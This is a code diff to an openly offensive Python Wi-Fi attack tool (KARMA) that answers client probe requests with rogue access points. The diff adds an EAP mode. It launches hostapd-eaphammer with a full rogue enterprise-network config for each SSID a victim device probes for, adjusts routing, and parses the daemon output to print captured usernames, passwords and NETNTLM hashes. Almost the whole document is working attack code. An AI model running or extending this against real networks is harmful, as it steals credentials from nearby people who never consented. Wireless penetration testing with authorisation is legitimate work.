@@ -93,6 +93,8 @@ def stop_APs():
 		if hostapd_wpa.dhcpd:
 			hostapd_wpa.dhcpd.stop()
 		hostapd_wpa.shutdown()
+	if hostapd_wpe:
+		hostapd_wpe.shutdown()
 	stop_scenarios()
 
 def control():
@@ -134,6 +136,9 @@ def NOTICE(msg, end='\n'):
 def WARN(msg, end='\n'):
 	print(Fore.LIGHTGREEN_EX + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)
 
+def CRIT(msg, end='\n'):
+	print(Fore.LIGHTRED_EX + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)
+
 def ERROR(msg, end='\n'):
 	print(Fore.RESET + "[!] [{time}] {msg}".format(time=get_time(), msg=msg), end=end)
 
@@ -141,6 +146,7 @@ class Hostapd:
 	config = ''
 	file = ''
 	name = ''
+	binary = ''
 	def __init__(self, iface, essid, password):
 		self.iface = iface
 		self.essid = essid
@@ -152,7 +158,7 @@ class Hostapd:
 			f.write(self.config.format(iface=self.iface, essid=self.essid, password=self.password))
 #		DEBUG("ifconfig {iface} up".format(iface=self.iface))
 #		os.system("ifconfig {iface} up".format(iface=self.iface))
-		self.hostapd = subprocess.Popen(["hostapd", self.file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		self.hostapd = subprocess.Popen([self.binary, self.file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		self.__status_thr = Thread(target=self.status)
 		self.__client_monitor_thr = Thread(target=self.client_monitor)
 		self.__status_thr.start()
@@ -182,7 +188,7 @@ class Hostapd:
 			if not line:
 				sleep(1)
 				continue
-#			DEBUG(line)
+			DEBUG(line)
 			line = line.decode("utf-8")
 			if line.find("AP-ENABLED") != -1:
 				self.is_up = True
@@ -220,12 +226,15 @@ class Hostapd:
 				break
 
 	def change_network_settings(self, network):
+		self.network = IPNetwork(network)
 		DEBUG("ifconfig {iface} {network}".format(iface=self.iface, network=network))
 		os.system("ifconfig {iface} {network}".format(iface=self.iface, network=network))
-		self.network = IPNetwork(network)
+		os.system("ip r add {network} dev {iface} table 97".format(iface=self.iface, network=str(self.network.cidr)))
+		os.system("ip rule add to {network} lookup 97".format(iface=self.iface, network=str(self.network.cidr)))
 
 
 class Hostapd_OPN(Hostapd):
+	binary = 'hostapd'
 	name = "OPN"
 	file = "/tmp/ap_opn.conf"
 	config = '''interface={iface}
@@ -239,6 +248,7 @@ ignore_broadcast_ssid=0
 '''
 
 class Hostapd_WPA(Hostapd):
+	binary = 'hostapd'
 	name = "WPA"
 	file = "/tmp/ap_wpa.conf"
 	config = '''interface={iface}
@@ -254,6 +264,97 @@ wpa_key_mgmt=WPA-PSK
 wpa_pairwise=CCMP
 wpa_passphrase={password}
 '''
+
+class Hostapd_WPE(Hostapd):
+	binary = 'hostapd-eaphammer'
+	name = "EAP"
+	file = "/tmp/ap_wpe.conf"
+	config = '''interface={iface}
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.key
+private_key_passwd=whatever
+dh_file=/etc/hostapd-wpe/certs/dh
+ssid={essid}
+channel=1
+hw_mode=g
+eap_server=1
+eap_fast_a_id=101112131415161718191a1b1c1d1e1f
+eap_fast_a_id_info=hostapd-wpe
+eap_fast_prov=3
+ieee8021x=1
+pac_key_lifetime=604800
+pac_key_refresh_time=86400
+pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
+wpa=2
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+logger_syslog=-1
+logger_syslog_level=2
+logger_stdout=-1
+logger_stdout_level=2
+ctrl_interface=/var/run/hostapd-wpe
+ctrl_interface_group=0
+beacon_int=100
+dtim_period=2
+max_num_sta=255
+rts_threshold=-1
+fragm_threshold=-1
+macaddr_acl=0
+auth_algs=3
+ignore_broadcast_ssid=0
+wmm_enabled=1
+wmm_ac_bk_cwmin=4
+wmm_ac_bk_cwmax=10
+wmm_ac_bk_aifs=7
+wmm_ac_bk_txop_limit=0
+wmm_ac_bk_acm=0
+wmm_ac_be_aifs=3
+wmm_ac_be_cwmin=4
+wmm_ac_be_cwmax=10
+wmm_ac_be_txop_limit=0
+wmm_ac_be_acm=0
+wmm_ac_vi_aifs=2
+wmm_ac_vi_cwmin=3
+wmm_ac_vi_cwmax=4
+wmm_ac_vi_txop_limit=94
+wmm_ac_vi_acm=0
+wmm_ac_vo_aifs=2
+wmm_ac_vo_cwmin=2
+wmm_ac_vo_cwmax=3
+wmm_ac_vo_txop_limit=47
+wmm_ac_vo_acm=0
+eapol_key_index_workaround=0
+own_ip_addr=127.0.0.1
+'''
+	def client_monitor(self):
+		pass
+
+	def status(self):
+		while True:
+			line = self.hostapd.stdout.readline()
+			if not line:
+				sleep(1)
+				continue
+			DEBUG(line)
+			line = line.decode("utf-8")
+			if line.find("AP-ENABLED") != -1:
+				self.is_up = True
+			elif line.find("AP-DISABLED") != -1:
+				self.is_up = False
+			elif line.find("STA") != -1 and line.find('associated') != -1:
+				client = line.split()[2]
+				vendor = lookup(client)
+				NOTICE("[{hostapd}] client {client} ({vendor}) connected".format(hostapd=self.name, client=client, vendor=vendor))
+			elif line.find("deauthenticated") != -1:
+				client = line.split()[2]
+				NOTICE("[{hostapd}] client {client} disconnected".format(hostapd=self.name, client=client))
+			elif line.find("username:") != -1 or line.find("password:") != -1 or line.find("NETNTLM:") != -1:
+				CRIT("[{hostapd}] {line}".format(hostapd=self.name, line=line.split('\n')[0]))
+			if self.is_shutdown:
+				break
 
 class DHCPD:
 	file = "/tmp/dhcp_{iface}.conf"
@@ -326,6 +427,8 @@ hostapd_opn = None
 hostapd_opn_is_start = False
 hostapd_wpa = None
 hostapd_wpa_is_start = False
+hostapd_wpe = None
+hostapd_wpe_is_start = False
 victim_trafic = PacketList()
 def start_AP_OPN(iface, essid):
 	global hostapd_opn, hostapd_opn_is_start, victim_trafic, handshakes, known_targets
@@ -427,6 +530,31 @@ def start_AP_WPA(iface, essid):
 	known_targets.clear()
 	hostapd_wpa_is_start = False
 
+def start_AP_EAP(iface, essid):
+	global hostapd_wpe, hostapd_wpe_is_start, known_targets
+	
+	if hostapd_wpe_is_start:
+		return
+	hostapd_wpe_is_start = True
+
+	hostapd_wpe = try_to_start_hostapd(Hostapd_WPE, iface, essid, password=False, max_attempts=5)
+	if hostapd_wpe.is_up:
+		INFO("run EAP network \"{essid}\" ({num})".format(num=pcap_no, essid=essid))
+		begin = time()
+		while time() - begin < TIMEOUT: # waiting first client
+			sleep(1)
+			if handshakes: # if it was WPA network
+				break
+		hostapd_wpe.shutdown()
+		INFO("stop EAP network \"{essid}\"".format(essid=essid))
+	else:
+		hostapd_wpe.shutdown()
+		ERROR("network EAP \"{essid}\" wasn't started".format(essid=essid))
+
+	hostapd_wpe = None
+	known_targets.clear()
+	hostapd_wpe_is_start = False
+
 def save(trafic, network_name):
 	target_file = '%s.pcap' % network_name
 	if not os.path.isfile(target_file):
@@ -446,7 +574,7 @@ def statistics(sta, essid):
 known_essids = set([])
 pcap_no = 1
 def parse_raw_80211(p):
-	global known_essids, hostapd_opn, hostapd_wpa, pcap_no, is_exit
+	global known_essids, hostapd_opn, hostapd_wpa, hostapd_wpe, pcap_no, is_exit
 	if is_exit:
 		raise Exception
 	if Dot11ProbeReq in p:
@@ -478,7 +606,7 @@ def parse_raw_80211(p):
 				if passwords_new:
 					for essid in passwords_new:
 						WARN("{essid} {password}".format(essid=essid, password=passwords_new[essid]))
-				if essid and not essid in known_essids and not hostapd_opn and not hostapd_wpa:
+				if essid and not essid in known_essids and not hostapd_opn and not hostapd_wpa and not hostapd_wpe:
 					pcap_no += 1
 					#os.system("killall -KILL hostapd 2> /dev/null")
 					if args.opn:
@@ -488,6 +616,11 @@ def parse_raw_80211(p):
 					#sleep(1)
 					if args.wpa:
 						Thread(target=start_AP_WPA, args=(args.wpa,essid)).start()
+						known_essids.add(essid)
+						probe_response(args.mon, sta, essid, is_wpa=True)
+					#sleep(1)
+					if args.eap:
+						Thread(target=start_AP_EAP, args=(args.eap,essid)).start()
 						known_essids.add(essid)
 						probe_response(args.mon, sta, essid, is_wpa=True)
 	'''else:
@@ -591,6 +724,7 @@ parser = argparse.ArgumentParser(description='KARMA - attack of unauthenticated 
 parser.add_argument("-mon", type=str, metavar='iface', default='', help="interface for monitoring 802.11 Probes")
 parser.add_argument("-opn", type=str, metavar='iface', default='', help="interface for starting OPN networks")
 parser.add_argument("-wpa", type=str, metavar='iface', default='', help="interface for starting WPA networks")
+parser.add_argument("-eap", type=str, metavar='iface', default='', help="interface for starting EAP networks")
 parser.add_argument("-T", type=int, metavar='seconds', default='20', help="wifi network working time")
 parser.add_argument("--essid", type=str, metavar='name', default='', help="force start wifi network with ESSID")
 parser.add_argument("--psk", type=str, metavar='password', default='', help="use PSK key for WPA networks")
@@ -611,6 +745,8 @@ if args.opn and args.essid:
 	start_AP_OPN(args.opn, args.essid)
 elif args.wpa and args.essid:
 	start_AP_WPA(args.wpa, args.essid)
+elif args.eap and args.essid:
+	start_AP_EAP(args.eap, args.essid)
 elif args.mon:
 	Thread(target=control).start()
 	Thread(target=sniffer, args=(args.mon,)).start()
